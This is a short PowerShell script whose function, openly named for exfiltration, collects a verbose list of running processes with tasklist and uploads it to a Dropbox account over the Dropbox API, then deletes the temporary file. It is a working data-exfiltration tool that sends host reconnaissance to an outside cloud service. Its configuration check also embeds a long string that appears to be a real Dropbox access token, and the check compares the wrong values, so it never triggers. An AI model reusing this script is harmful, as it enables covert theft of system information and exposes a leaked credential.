# This function gets a list of running processes and uploads it to a specified Dropbox account.
function Exfiltrate-ProcessInfoToDropbox {
    # Use a try...finally block to ensure the temporary file is always cleaned up.
    $localFilePath = New-TemporaryFile
    try {
        # Get the verbose process list and save it to the temporary file.
        tasklist /v | Out-File -FilePath $localFilePath.FullName

        # --- CONFIGURATION ---
        # Required: Replace the placeholder with your actual Dropbox App access token.
        $accessToken = "<YOUR_DROPBOX_ACCESS_TOKEN>" 
        $dropboxFilePath = "/tasklist_output.txt" # The destination path in your Dropbox.
        # --- END CONFIGURATION ---

        # Check if the access token has been set.
        if ($accessToken -eq "sl.u.AF2wGRjqTToGYgDeutMmrc7_8iIzAqyeFqC4DrZUCrGFZUNt1Rvwxrh8mgfLGf8_PkOayoF2rcnHzdlFndQJCeH-4KU14_lc8OwEVDGhn9AtGgKglisqMVmOwPyIgyqF1ETnjCM23gfbXXFzRZkLP7Knu8hrbys0epTixsFZXTwkVfwIPs3qfxrF_ZTsDwZ2MIDzHwuP7g0my3vNZvgI5rqSGL-sth-2e17UoCnWaNgAiFr73Im_orlzzK0ctmBBKP4vDoL_UrpsrmcHpCWWKfUIGYXYwILGMD2Yh_AhD803wA3Z1ZttY5QwbIkQRny5vtZUf-WXL6I60aVxlVfZQC6ZX2P572FwAx5cs-pStfd7vKJjd8eqoc2OmdACdItQ3t3EZ06MQfjKHi8MUOOsAnm_wlAxn9LuJlVcH97dGwN6sSLNiDj1gNgBkLATLlynp8d9VOuem5yz17dPHgNwwtgJ1DzuEKSmuy5k4gRAXNqMAQwGyPupwDB2V9eLwMxtZb9oyRtD9Z6Hq7bdaUf2AGWaNyK_DCg0D4rH_c6XioYE6Loj740Od_X_4hE7AI6nLP9rZ3nmAMjma2yyGa3nrEgckxpNyCl2O7RwpNPJkd7Uo3hRbLwmbsdN_Oyauesil_bcLtZwXTQ1kC2tY1jVzt-MhZsGTkojAyH9zeTD5M5D_0iEBjk7LMCJqGf104_vf7c7S7Ave06Pk1s_cte4paDmimtvDD2x9oxFbhWTxpwklh_kJPVqOaz4-AOVZ04aB4_T7kgwMqE39X7xIYsp_162UiLpmyYIM_Hnvj8Q3w_Vo6zOAQuAGYBMExZbWIrm2PnvTU7RSSUQKTKNN5D2oAbNDh9s6qLHTr1MpRmMKrG1Wl3efRhVD5JKm8N6ZtkxLh2n9jCBnEAlKPr3UVpSK7n8HG3K15MTqHEzFhrFI35AjVX8ejZLqf-c34cNrXUTxXxlmFE2OwgrjvBVGSwyi-hdIZrxYlecsobq94crWA7AeUoRWqmjrMvb0bF-9947T4JflJVuCSxiXqTp8yjzfAaFPwUnUHbSLJbYREJXeK8lVHDFmo4Nv3mHJY8xThJdquMiln9SZYWSZErQtJD07kAaLD8v6uwBt7xeppDPB2fflMbgMqicEg8xc5GtEK7PTsZlT6gkOwShDZMCQEzB4BRlboACVeDE_hNqO30J-Iftwj6BU02m1wTqK_SMsjIEfmIQXrBEjgNibuZOQUEORaCiA5yLVHjEZynnr3QLWfpJVaLwUlE9IedUnLZDIed2blJ_zdGtSI7ylkM8oEcHHY5NyKDkSm--DUo4JcxTn7rFLAlFNdXWh6ZXZqO11YIkWDlMbxr19rRFwwevJS3Z-7CR8OoJxNde27EY33EoWOLKjO_PzkksBt9tNfbOi0uOC5rHHxT_12nE_86kC_dkqzu8ME930vTPMArZ5yVP530XgA") {
            Write-Error "Execution stopped: You must set your Dropbox access token in the script."
            return
        }

        # Define the API URL and headers for the upload request.
        $uploadUrl = "https://content.dropboxapi.com/2/files/upload"
        $headers = @{
            "Authorization"     = "Bearer $accessToken"
            "Dropbox-API-Arg"   = '{"path":"' + $dropboxFilePath + '","mode":"add","autorename":true,"mute":false}'
            "Content-Type"      = "application/octet-stream"
        }

        # Upload the file using the -InFile parameter for proper streaming.
        Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -InFile $localFilePath.FullName
        
        Write-Host "Process list successfully uploaded to Dropbox."

    }
    finally {
        # This cleanup code runs whether the upload succeeds or fails.
        if (Test-Path -Path $localFilePath.FullName) {
            Remove-Item -Path $localFilePath.FullName -Force
        }
    }
}

# Execute the function
Exfiltrate-ProcessInfoToDropbox
